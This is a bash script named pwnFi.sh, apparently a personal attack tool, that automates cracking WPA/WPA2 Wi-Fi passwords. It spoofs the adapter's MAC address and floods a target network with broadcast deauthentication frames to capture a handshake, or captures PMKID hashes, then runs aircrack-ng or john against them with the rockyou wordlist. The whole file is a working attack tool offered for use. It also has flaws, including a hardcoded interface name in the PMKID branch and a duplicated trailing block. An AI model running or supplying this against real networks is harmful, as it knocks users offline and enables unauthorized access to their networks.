#!/bin/bash

# v1
# WPA/WPA2 - PSK ||| Handshake & PKMID Attack
# https://lautarovculic.com

# Colors #########################
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"
##################################

trap ctrl_c INT
function ctrl_c(){
	echo -e "\n${redColor}Exiting...${endColor}\n"
	tput cnorm; sudo airmon-ng stop ${networkCard}mon > /dev/null 2>&1; sudo ifconfig ${networkCard} up
	sudo rm cap* 2>/dev/null
	sudo rm dump*
	sudo rm hashes
	exit 0
}

function helpPanel(){
	echo -e "\n${yellowColor}>>${endColor} ${grayColor} Usage: ${endColor}${redColor}sudo${endColor}${grayColor} ./pwnFi.sh${endColor}"
	echo -e "\t${yellowColor}-a${endColor}${grayColor} Attack Mode${endColor}"
	echo -e "\t\t${yellowColor}Handshake${endColor}"
	echo -e "\t\t${yellowColor}PKMID${endColor}"
	echo -e "\t${yellowColor}-n${endColor}${grayColor} Network Card${endColor}"
	echo -e "\t${yellowColor}-h${endColor}${grayColor} Show this message${endColor}"
	echo -e "\n${yellowColor}Example:${endColor} ${grayColor}sudo ./pwnFi.sh -a PKMID -n wlan0${endColor}"
	echo -e "\n${grayColor}Net cards available:${endColor}\n${yellowColor}$(ip link show | awk '$2 !~ /^[0-9a-fA-F:]{17}$/ {print $2}' | tr -d ':')${endColor}\n"
	exit 0
}

function startAttack(){
	clear
	echo -e "${greenColor}[*]${endColor} ${grayColor}Setting monitor mode...${endColor}"

	sudo ifconfig ${networkCard} up

	sudo airmon-ng start $networkCard > /dev/null 2>&1

	sudo ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1

	sudo ifconfig ${networkCard}mon up

	sudo killall dhclient wpa_supplicant 2>/dev/null


	if [ "$(echo $attackMode)" == "Handshake" ]; then
	
		echo -e "\n${greenColor}[*]${endColor} ${grayColor}New MAC Adrress:${endColor} ${redColor}$(sudo macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColor}"
		echo -e "\n${redColor}--------------------------------${endColor}"

		xterm -hold -e "airodump-ng ${networkCard}mon" 2>/dev/null &
		airodumpProcess=$!
		echo -ne "\n${greenColor}[*]${endColor} ${grayColor}Enter ESSID: ${endColor}" && read essidName
		echo -ne "\n${greenColor}[*]${endColor} ${grayColor}Enter Channel: ${endColor}" && read channelAP

		kill -9 $airodumpProcess
		wait $airodumpProcess 2>/dev/null


		xterm -hold -e "airodump-ng -c $channelAP -w cap --essid $essidName ${networkCard}mon" 2>/dev/null &
		airodumpProcess2=$!

		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $essidName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" 2>/dev/null &
		aireplayProcess=$!
		sleep 5; kill -9 $aireplayProcess 2>/dev/null; wait $aireplayProcess 2>/dev/null

		sleep 20; kill -9 $airodumpProcess2
		wait $airodumpProcess2 2>/dev/null


		xterm -hold -e "aircrack-ng -w /usr/share/seclists/rockyou.txt cap-01.cap" 2>/dev/null &

		sudo airmon-ng stop ${networkCard}mon > /dev/null 2>&1; sudo ifconfig ${networkCard} up
		exit 0
	elif [ "$(echo $attackMode)" == "PKMID" ]; then
		clear; echo -e "\n${greenColor}[*]${endColor} ${grayColor}Starting PKMID Attack...${endColor}\n"

		timeout 60 bash -c "sudo hcxdumptool -i wlp5s0f4u2mon -w dumpfile.pcapng -F --rds=1"
		clear
		echo -e "\n\n${greenColor}[*]${endColor} ${grayColor}Getting Hashes...${endColor}"
		sudo hcxpcaptool -z hashes dumpfile.pcapng; sudo rm dumpfile.pcapng 2>/dev/null

		test -f hashes
		if [ "$(echo $?)" == "0" ]; then
			sudo airmon-ng stop ${networkCard}mon > /dev/null 2>&1; sudo ifconfig ${networkCard} up

			clear
			echo -e "\n${greenColor}[*]${endColor} ${grayColor}Cracking hashes...${endColor}"
			sleep 2
			sudo john --wordlist=/usr/share/seclists/rockyou.txt hashes
		else
			echo -e "\n${redColor}Error getting packages or data...${endColor}\n"
			sudo rm cap*
			sudo rm dump*
			sudo rm hashes
			sleep 2
		fi
	else
		echo -e "\n${redColor}ERROR IN MODE TYPE${endColor}"
		helpPanel
	fi
}

function dependencies(){
	tput civis

	clear; dependencies=(macchanger xterm ifconfig dhclient hcxdumptool hcxpcaptool john aireplay-ng airmon-ng aircrack-ng airodump-ng)

	echo -e "${yellowColor}>> Checking dependencies...${endColor}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n\t${yellowColor}>>${endColor} ${grayColor}Tool ${endColor}${redColor}$program${endColor}${grayColor}...${endColor}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e "${greenColor} (OK)${endColor}"
		else
			echo -e "${redColor} (X)${endColor}"
			if [[ "$(lsb_release -si)" == "Ubuntu" || "$(lsb_release -si)" == "Debian" ]]; then
				export DEBIAN_FRONTEND=noninteractive
				echo -e "${yellowColor}Installing $program${endColor}"
				sudo apt-get install aircrack-ng macchanger xterm hcxdumptool hcxpcaptool -y
			elif [ "$(lsb_release -si)" == "Arch" ]; then
				echo -e "${yellowColor}Installing $program${endColor}"
				sudo pacman -Syyu aircrack-ng macchanger xterm ifconfig dhclient
			else
				echo -e "${yellowColor}Installing $program${endColor}"
				sudo apt-get install aircrack-ng macchanger xterm hcxdumptool hcxpcaptool -y
			fi; tput cnorm; sleep 1; exit 0
		fi; tput cnorm; sleep 1;
	done
}


if [ "$(id -u)" == "0" ]; then
	
	declare -i paramCounter=0;  while getopts ":a:n:h:" arg; do
		case $arg in
			a) attackMode=$OPTARG; let paramCounter+=1 ;;
			n) networkCard=$OPTARG; let paramCounter+=1 ;;
			h) helpPanel ;;
		esac
	done

	if [ $paramCounter -ne 2 ]; then
		helpPanel
	else
		sudo airmon-ng stop ${networkCard}mon > /dev/null 2>&1; sudo ifconfig ${networkCard} up
		dependencies
		startAttack
		tput cnorm; sudo rm cap* 2>/dev/null
	fi

else
	echo -e "\n${redColor}>> You must be root <<${endColor}\n"
fi
	echo -e "\n${redColor}>> You must be root <<${endColor}\n"
fi
